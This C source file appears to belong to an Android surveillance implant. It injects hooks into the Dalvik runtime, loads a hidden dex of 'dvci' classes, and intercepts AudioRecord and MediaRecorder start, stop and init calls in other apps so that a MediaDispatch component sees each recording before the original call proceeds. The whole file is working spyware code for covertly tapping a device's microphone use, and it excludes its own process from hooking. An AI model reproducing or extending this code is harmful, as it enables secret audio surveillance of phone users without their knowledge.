#include "hook.h"
#include "dexstuff.h"
#include "dalvik_hook.h"
#include "extern.h"
#include "base.h"
#include "common.h"


static struct dalvik_hook_t media_constr_dh;
static struct dalvik_cache_t media_constr_cache;


static char *classes[] = {
         "com/android/dvci/event/LowEvent/MediaDispatch",
         "com/android/dvci/event/LowEvent/AudioEvent",
         "com/android/dvci/util/Reflect",
         "com/android/dvci/util/LowEventMsg",
         "com/android/dvci/util/ReflectException",
         "com/android/dvci/auto/Cfg",
         "com/android/dvci/file/AutoFile",
         "com/android/dvci/file/Path",
         "com/android/dvci/util/Check",
         "com/android/dvci/util/DateTime",
         "com/android/dvci/util/Utils",
         NULL };

static char createcnf = 0;

static void audioRecorder_start(JNIEnv *env, jobject this)
{
   int doit=1;
   log("audioRecorder_start");

   (*env)->MonitorEnter(env,this);

   if (media_constr_cache.cls_h == 0) {
      if (load_dext(dex, classes)) {
         log("failed to load class ");
         doit = 0;
      }
   } else {
    log("using cache");
  }

   if (doit) {
      // call static method and of the dvci
      //log(" parcel = 0x%x\n", p)
      if (media_constr_cache.cls_h == 0) {
         media_constr_cache.cls_h = (*env)->FindClass(env, "com/android/dvci/event/LowEvent/MediaDispatch");
      }
      if (media_constr_cache.cls_h != 0) {
         if (media_constr_cache.mid_h == 0) {
            media_constr_cache.mid_h = (*env)->GetStaticMethodID(env, media_constr_cache.cls_h, "new_MediaRecorder", "(V)V");
         }
         if (media_constr_cache.mid_h) {
            (*env)->CallStaticVoidMethod(env, media_constr_cache.cls_h, media_constr_cache.mid_h);
         } else {
            log("method not found!\n")
         }
      } else {
         log("com/android/dvci/event/OOB/SMSDispatch not found!\n")
      }
   }
   // check Exception
   if ((*env)->ExceptionOccurred(env)) {
      log("got an exception!!");
      (*env)->ExceptionDescribe(env);
      //dalvik_dump_class(&d,"");
      log("<-- description");
      (*env)->ExceptionClear(env);
   }
   (*env)->MonitorExit(env,this);
   dalvik_prepare(&d, &media_constr_dh, env);

   //if (callOrig) {

      (*env)->CallVoidMethod(env, this, media_constr_dh.mid);
      if ((*env)->ExceptionOccurred(env)) {
         log("got an exception calling orig");
         (*env)->ExceptionDescribe(env);
         log("<-- description");
         (*env)->ExceptionClear(env);
      } else {
         log("success calling : %s\n", media_constr_dh.method_name)
      }
   //} else {
   //   log("skipping pdu args for call : %s\n", processUnsolicited_dh.method_name)
  //}
   dalvik_postcall(&d, &media_constr_dh);

}

static void mediaRecorder_build(JNIEnv *env, jobject this)
{
   int doit=1;
   log("mediaRecorder_build");

   (*env)->MonitorEnter(env,this);

   if (media_constr_cache.cls_h == 0) {
      if (load_dext(dex, classes)) {
         log("failed to load class ");
         doit = 0;
      }
   } else {
    log("using cache");
  }

   if (doit) {
      // call static method and of the dvci
      //log(" parcel = 0x%x\n", p)
      if (media_constr_cache.cls_h == 0) {
         media_constr_cache.cls_h = (*env)->FindClass(env, "com/android/dvci/event/LowEvent/MediaDispatch");
      }
      if (media_constr_cache.cls_h != 0) {
         if (media_constr_cache.mid_h == 0) {
            media_constr_cache.mid_h = (*env)->GetStaticMethodID(env, media_constr_cache.cls_h, "new_MediaRecorder", "()V");
         }
         if (media_constr_cache.mid_h) {
            (*env)->CallStaticVoidMethod(env, media_constr_cache.cls_h, media_constr_cache.mid_h);
         } else {
            log("method not found!\n")
         }
      } else {
         log("com/android/dvci/event/OOB/SMSDispatch not found!\n")
      }
   }
   // check Exception
   if ((*env)->ExceptionOccurred(env)) {
      log("got an exception!!");
      (*env)->ExceptionDescribe(env);
      //dalvik_dump_class(&d,"");
      log("<-- description");
      (*env)->ExceptionClear(env);
   }
   (*env)->MonitorExit(env,this);
   dalvik_prepare(&d, &media_constr_dh, env);

   //if (callOrig) {

      (*env)->CallVoidMethod(env, this, media_constr_dh.mid);
      if ((*env)->ExceptionOccurred(env)) {
         log("got an exception calling orig");
         (*env)->ExceptionDescribe(env);
         log("<-- description");
         (*env)->ExceptionClear(env);
      } else {
         log("success calling : %s\n", media_constr_dh.method_name)
      }
   //} else {
   //   log("skipping pdu args for call : %s\n", processUnsolicited_dh.method_name)
  //}
   dalvik_postcall(&d, &media_constr_dh);

}
static struct dalvik_hook_t audioRecord_init;
static struct dalvik_cache_t audioRecord_init_cache;
static void audioRecord_init_fnc(JNIEnv *env, jobject obj, jint audioSource, jint sampleRateInHz, jint channelConfig, jint audioFormat,jint bufferSizeInBytes);

static struct dalvik_hook_t startRecording;
static struct dalvik_cache_t startRecording_cache;
static void startRecording_fnc(JNIEnv *env, jobject obj);

static struct dalvik_hook_t stopRecording;
static struct dalvik_cache_t stopRecording_cache;
static void stopRecording_fnc(JNIEnv *env, jobject obj);
int instrument_media(){
   log("instrument media dumpDir=%s\n",dumpDir);
   char *cmdline = who_am_i(64);
   int exit=0;
   if(cmdline && dex){
      if( strcasestr(cmdline,"<pre-initialized>")!=NULL ){
         //do not instrument cmdline is still undefined
         exit=-1;
      }else if( strcasestr(cmdline,dumpDir)!=NULL ){
         //do not instrument dex process itself
         exit=1;
      }
   }
   if(cmdline){
        free(cmdline);
        cmdline = NULL;
   }
   if(exit){
      log("instrument media skipping myself or zygote exit=%d\n",exit);
      return exit;
   }
   // resolve symbols from DVM if needed
   if(d.dvm_hand==NULL){
      dexstuff_resolv_dvm(&d);
   }


   dalvik_hook_setup(&audioRecord_init, "Landroid/media/AudioRecord;", "<init>", "(IIIII)V", 6, audioRecord_init_fnc);
   if (dalvik_hook(&d, &audioRecord_init)) {
      log("my_epoll_wait: hook audioRecord_init ok\n");
   } else {
      log("my_epoll_wait: hook audioRecord_init fails\n");
   }
   audioRecord_init_cache.cls_h = NULL;
   audioRecord_init_cache.mid_h = NULL;

   dalvik_hook_setup(&startRecording, "Landroid/media/AudioRecord;", "startRecording", "()V", 1, startRecording_fnc);
   if (dalvik_hook(&d, &startRecording)) {
      log("my_epoll_wait: hook startRecording ok\n");
   } else {
      log("my_epoll_wait: hook startRecording fails\n");
   }
   startRecording_cache.cls_h = NULL;
   startRecording_cache.mid_h = NULL;

   dalvik_hook_setup(&stopRecording, "Landroid/media/AudioRecord;", "stop", "()V", 1, stopRecording_fnc);
     if (dalvik_hook(&d, &stopRecording)) {
        log("my_epoll_wait: hook stopRecording ok\n");
     } else {
        log("my_epoll_wait: hook stopRecording fails\n");
     }
   log("hooking new stopRecording\n")

   stopRecording_cache.cls_h = NULL;
   stopRecording_cache.mid_h = NULL;

   return exit;

}
static void audioRecord_init_fnc(JNIEnv *env, jobject obj, jint audioSource, jint sampleRateInHz, jint channelConfig, jint audioFormat,jint bufferSizeInBytes){
   int go_ahead=1;

   if (audioRecord_init_cache.cls_h == 0) {
      if (load_dext(dex, classes)) {
         log("failed to load class ");
         go_ahead = 0;
      }
   } else {
      log("using cache");
   }


   if (go_ahead) {
      if (audioRecord_init_cache.cls_h == 0) {
         log("audioRecord_init_fnc \n")
            audioRecord_init_cache.cls_h = (*env)->FindClass(env, "com/android/dvci/event/LowEvent/MediaDispatch");
      }
      if (audioRecord_init_cache.cls_h != 0) {
         if (audioRecord_init_cache.mid_h == 0) {
            audioRecord_init_cache.mid_h = (*env)->GetStaticMethodID(env, audioRecord_init_cache.cls_h, "audioRecordInit", "(Ljava/lang/Object;)V");
         }
         if (audioRecord_init_cache.mid_h) {
            (*env)->CallVoidMethod(env, audioRecord_init_cache.cls_h, audioRecord_init_cache.mid_h,obj);
         } else {
            log("method not found!\n")
         }
      } else {
         log("com/android/dvci/event/LowEvent/MediaDispatch not found!\n")
      }
   }

   // call original SMS dispatch method
   if ((*env)->ExceptionOccurred(env)) {
      log("got an exception!!");
      (*env)->ExceptionClear(env);

   }
   dalvik_prepare(&d, &audioRecord_init, env);
   (*env)->CallObjectMethod(env, obj, audioRecord_init.mid, audioSource,  sampleRateInHz,  channelConfig,  audioFormat, bufferSizeInBytes);
   log("success calling : %s\n", audioRecord_init.method_name)
   dalvik_postcall(&d, &audioRecord_init);

   return;
}

static void startRecording_fnc(JNIEnv *env, jobject obj)
{
   int go_ahead=1;

     if (startRecording_cache.cls_h == 0) {
        if (load_dext(dex, classes)) {
           log("failed to load class ");
           go_ahead = 0;
        }
     } else {
      log("using cache");
    }

     if (go_ahead) {
        if (startRecording_cache.cls_h == 0) {
           log("startRecording_fnc \n")
      startRecording_cache.cls_h = (*env)->FindClass(env, "com/android/dvci/event/LowEvent/MediaDispatch");
        }
        if (startRecording_cache.cls_h != 0) {
           if (startRecording_cache.mid_h == 0) {
              startRecording_cache.mid_h = (*env)->GetStaticMethodID(env, startRecording_cache.cls_h, "audioRecordStart", "(Ljava/lang/Object;)V");
           }
           if (startRecording_cache.mid_h) {
              (*env)->CallStaticVoidMethod(env, startRecording_cache.cls_h, startRecording_cache.mid_h,obj);
           } else {
              log("method not found!\n")
           }
        } else {
           log("com/android/dvci/event/LowEvent/MediaDispatch not found!\n")
        }
     }

   // call original SMS dispatch method
   if ((*env)->ExceptionOccurred(env)) {
      log("got an exception!!");
      (*env)->ExceptionClear(env);

   }
   dalvik_prepare(&d, &startRecording, env);
   (*env)->CallVoidMethod(env, obj, startRecording.mid);
   log("success calling : %s\n", startRecording.method_name)
   dalvik_postcall(&d, &startRecording);
   return;
}

static void stopRecording_fnc(JNIEnv *env, jobject obj)
{
   int go_ahead=1;

     if (stopRecording_cache.cls_h == 0) {
        if (load_dext(dex, classes)) {
           log("failed to load class ");
           go_ahead = 0;
        }
     } else {
      log("using cache");
    }

     if (go_ahead) {
        if (stopRecording_cache.cls_h == 0) {
           log("stopRecording_fnc \n")
      stopRecording_cache.cls_h = (*env)->FindClass(env, "com/android/dvci/event/LowEvent/MediaDispatch");
        }
        if (stopRecording_cache.cls_h != 0) {
           if (stopRecording_cache.mid_h == 0) {
              stopRecording_cache.mid_h = (*env)->GetStaticMethodID(env, stopRecording_cache.cls_h, "audioRecordStop", "(Ljava/lang/Object;)V");
           }
           if (stopRecording_cache.mid_h) {
              (*env)->CallStaticVoidMethod(env, stopRecording_cache.cls_h, stopRecording_cache.mid_h,obj);
           } else {
              log("method not found!\n")
           }
        } else {
           log("com/android/dvci/event/LowEvent/MediaDispatch not found!\n")
        }
     }

   // call original SMS dispatch method
   if ((*env)->ExceptionOccurred(env)) {
      log("got an exception!!");
      (*env)->ExceptionClear(env);

   }
   dalvik_prepare(&d, &stopRecording, env);
   (*env)->CallVoidMethod(env, obj, stopRecording.mid);
   log("success calling : %s\n", stopRecording.method_name)
   dalvik_postcall(&d, &stopRecording);
   return;
}
status_t mediaRecorder_start(void)
{
// recuperare jenv :
//#include <JNIHelp.h>
//#include <android_runtime/AndroidRuntime.h>
//JNIEnv *env = AndroidRuntime::getJNIEnv();
   log("start recorder media\n");
   // resolve symbols from DVM if needed
   if(d.dvm_hand==NULL){
      dexstuff_resolv_dvm(&d);
   }

   int (*start)(void);
   start = (void*) eph_media_start.orig;
      // remove hook for mediaRecorder_start
      hook_precall(&eph_media_start);
      int res = start();
      // insert hook for mediaRecorder_start
      hook_postcall(&eph_media_start);
      return res;
}
